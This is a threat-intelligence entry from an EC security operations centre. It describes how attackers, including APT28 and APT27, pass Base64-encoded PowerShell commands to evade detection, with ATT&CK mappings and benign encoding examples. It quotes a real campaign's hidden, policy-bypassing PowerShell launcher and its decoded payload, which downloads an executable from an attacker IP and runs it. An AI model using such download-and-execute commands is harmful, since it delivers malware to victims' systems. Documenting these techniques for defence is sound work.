name: Powershell with encoded payload passed to cmdline
criticality: Medium
references:
  public:
    1: https://mikefrobbins.com/2017/06/15/simple-obfuscation-with-powershell-using-base64-encoding/
    2: https://stackoverflow.com/questions/6295957/using-powershell-encodedcommand-to-pass-parameters
    3: https://www.systanddeploy.com/2021/01/encode-script-or-command-to-base64-and.html

metadata:
  uuid: bdc58fee-8da6-4fc9-8fbd-30f8fd156bc7
  schema: tvm::2.0
  version: 1
  created: 2024-04-23
  modified: 2024-04-24
  tlp: clear
  organisation:
    uuid: 56b0a0f0-b0bc-47d9-bb46-02f80ae2065a
    name: EC DIGIT CSOC

threat:
  actors:
    - name: att&ck::G0007 #[Enterprise] APT28, FROZENLAKE, Fancy Bear, Forest Blizzard, Group 74, IRON TWILIGHT, Pawn Storm, SNAKEMACKEREL, STRONTIUM, Sednit, Sofacy, Swallowtail, TG-4127, Threat Group-4127, Tsar Team
    - name: misp::5b4ee3ea-eee3-4c8e-8323-85ae32658754 #APT28, Pawn Storm, FANCY BEAR, Sednit, SNAKEMACKEREL, Tsar Team, TG-4127, STRONTIUM, Swallowtail, IRON TWILIGHT, Group 74, SIG40, Grizzly Steppe, G0007, ATK5, Fighting Ursa, ITG05, Blue Athena, TA422, T-APT-12, APT-C-20, UAC-0028, FROZENLAKE, Sofacy, Forest Blizzard, BlueDelta, Fancy Bear, GruesomeLarch
    - name: att&ck::G0027 #[Enterprise] Threat Group-3390, APT27, BRONZE UNION, Earth Smilodon, Emissary Panda, Iron Tiger, LuckyMouse, TG-3390
    - name: misp::834e0acd-d92a-4e38-bb14-dc4159d7cb32 #APT27, GreedyTaotie, TG-3390, EMISSARY PANDA, TEMP.Hippo, Red Phoenix, Budworm, Group 35, ZipToken, Iron Tiger, BRONZE UNION, Lucky Mouse, G0027, Iron Taurus, Earth Smilodon
  killchain: Defense Evasion
  att&ck:
    - T1027.010 #Obfuscated Files or Information: Command Obfuscation
    - T1059 #Command and Scripting Interpreter
    - T1059.001 #Command and Scripting Interpreter: PowerShell
    - T1140 #Deobfuscate/Decode Files or Information
    - T1068 #Exploitation for Privilege Escalation
  #chaining:
    #- relation: 
      #vector: 
      #description: |
        #Type Here
  #cve:
    #-
  domains:
    - Enterprise
    - Private Cloud
    - Public Cloud
  terrain: |
    A threat actors need an initial access to the system to use PowerShell
    console to execute commands to obfuscate their traffic and activities.
  targets:
    - Remote access
    - Workstations
    - Desktop
  platforms:
    - PowerShell
    - Windows
  severity: Localised incident
  leverage:
    - Dwelling
    - Tampering
  impact:
    - Impairement
  viability: Likely
  description: |
    When working with PowerShell, a threat actor can encode a command or script
    using Base64 or other type of encoding and pass it as a parameter to the
    command line. This technique is useful for obfuscating sensitive
    information or executing complex commands. (ref [1])  

    This encoding payloads technique with PowerShell comamnds is observed in
    some Russian military-linked actors activities, for example EARLYBLOOM
    campaign targeting Ukrainian media entities or the more recent one
    DARKCRYSTALRAT backdoor. (ref [a])  
    

    The malicious document contains a macro which, upon execution,
    creates a batch script at C:\Users\public\new[.]bat with the
    following content:  

    powershell -exec bypass -noP -w hidden -nonI -enc"{string}" del %0;

    The Base64-encoded PowerShell decodes to:

    (New-objectNetWebClient)DownloadFile('hxxp://{ip_address}/MSDriverLoader[.]exe','C:\Users\Public\MSLoaderexe');Start-Process 'c:\Users\Public\MSLoaderexe'
    
    (ref [a])  
    
    Other possible examples for encoding with PowerShell commands: 

    Encoding a Command with Base64

    1. Create a command as a string. 
    
    $command = 'dir "C:\Program Files"'

    2. Convert the command to Base64:

    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $encodedCommand = [Convert]::ToBase64String($bytes)

    Now you can run the encoded command using powershell.exe:

    powershell.exe -encodedCommand $encodedCommand

    It's also possible to encode domain names, for example: 

    Powershell input:

    [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("'sample_domain.com'"))

    Threat actors also use PowerShell scripts for faster encoding process and result.  

    An example of Powershell script (ref [2])  

    param(
    [Parameter()][Alias("un")][string]$Username,
    [Parameter()][Alias("pw")][string]$Password
    )

    Write-Host "Username: $Username"
    Write-Host "Password: $Password"


